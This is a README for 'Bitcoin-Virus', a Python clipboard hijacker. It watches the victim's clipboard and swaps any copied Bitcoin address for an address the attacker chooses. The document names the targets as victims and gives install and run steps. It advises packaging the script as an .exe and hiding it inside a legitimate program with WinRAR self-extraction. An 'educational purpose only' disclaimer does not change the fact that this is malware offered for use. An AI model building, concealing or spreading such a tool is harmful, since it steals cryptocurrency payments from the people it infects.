# Bitcoin-Virus
Bitcoin wallet address swapper (Python3) (Only Windows)  
This script waits for any text to be copied to the victims clipboard, validates and returns whether the copied text is a valid bitcoin address or not, and if valid, swaps the copied bitcoin address by any custom address (replace on line 31 in virus.py -> pyperclip.copy('{your btc address}')).  

##### WARNING  
This script ouhgt to be used for educational purpose only, I'm not responsible for any misuse.


## Modules used  
* pyperclip==1.8.0  
* base58==2.0.0  

* Module installation:
```
pip3 install -r requirements.txt
```

## Run
* We recommend creating a .exe file by using auto-py-to-exe (one file and windows based)
* To hide it on another legit executable program play with Win Rar autoextraction, I ain't giving more clues
* The virus can be stopped by just copying to the clipboard the next text: 'stopvirusnow'
* In order to run on your computer for testing purposes just:
```
python virus.py
```
* Test it by copying this BTC address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 and pasting it anywhere, it should paste your custom address
